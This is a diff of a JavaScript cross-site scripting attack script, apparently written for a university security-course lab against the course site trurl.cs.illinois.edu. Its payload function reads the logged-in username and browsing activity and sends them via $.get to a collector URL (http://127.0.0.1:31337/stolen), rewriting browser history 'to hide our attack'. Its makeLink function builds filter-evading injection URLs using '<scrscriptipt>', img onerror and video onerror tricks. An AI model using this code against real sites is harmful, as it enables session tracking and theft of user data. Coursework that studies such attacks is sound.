@@ -18,43 +18,19 @@ function payload(attacker) {
 	var link = /http:/.source + y+y+/trurl.cs.illinois.edu/.source+y;
 	console.log(link);
 	function proxy(href) {
-		$("html").load(href, function(){
-			$("html").show();
-			window.onpopstate = function(event) 
-			{
+		$(/html/.source).load(href, function(){
+            $(/a/.source).filter(/:contains(<script>)/.source).remove();
+            $(/html/.source).show();   
+            window.onpopstate = function(event) {
             proxy(document.location.href.split(/.edu/.source)[1]) ; 
-       		 }	
-			//log(attacker,{event:"nav", uri:href});
-			// $("#query").val("pwned!")
-			// is someone logged in
-			if ($(/#logged-in-user/.source).text())
-			{
-				// time to log 
-				$.get(attacker,{event:"nav", user:$(/#logged-in-user/.source).text(),uri: href});
-				//historyF();
-				// chagning the URL to hide our attack
-				if (!history.state)
-				{
-					history.replaceState(null,null,href);
-				}
-				
-				//testing 
-				//$("#query").val("pwned!");
-			}
-			// no user 
-			else 
-			{
-				// time to log
-				$.get(attacker,{event:"nav", uri:href});
-				//historyF();
-				//changing the URL to hide our attack
-				//history.pushState(null,null,'http://trurl.cs.illinois.edu/');
-				if (!history.state)
-				{
-					history.replaceState(null,null,href);
-				}
-				// $("#query").val("pwned2!");
-			}
+        }
+            if ($(/#logged-in-user/.source).text())
+                $.get(attacker,{event: /nav/.source, user: u , uri: href});
+            else 
+                $.get(attacker,{event: /nav/.source, uri: href});
+                
+            if (!history.state)
+                history.replaceState(null, null, href);
 
 			$(/#search-btn/.source).click(function(event)
 			{
@@ -145,17 +121,16 @@ function makeLink(xssdefense, target, attacker) {
             encodeURIComponent("<scrscriptipt"+">"+payload.toString()+";payload(\"" + attacker+"\");</scrscriptipt"+">");
             break;
         case 2:
-            return target+"./search?xssdefense="+xssdefense.toString()+"&q="+
-            encodeURIComponent("<img src=x onerror=" +payload.toString()+";payload(\"" + attacker+"\");>");
+            return target+"./search?xssdefense="+xssdefense.toString()+"&q="+ encodeURIComponent("<img src='xxx' onerror=\'" + payload.toString() + ";payload(\"" + attacker + "\");\'" + ">");
             break;
         case 3:
-            return target + "./search?xssdefense=" + xssdefense.toString() + "&q=" +
-            encodeURIComponent("<video src='xxx' onerror=" + payload.toString() + ";payload(\"" + attacker + "\");>");
+            return target + "./search?xssdefense=" + xssdefense.toString() + "&q=" + encodeURIComponent("<video src='xxx' onerror=\'" + payload.toString() + ";payload(\"" + attacker + "\");\'>");
             break;
 	}
 	}
 }
-var xssdefense = 2;
+
+var xssdefense = 3;
 var target = "http://trurl.cs.illinois.edu/";
 var attacker = "http://127.0.0.1:31337/stolen";
 $(function() {
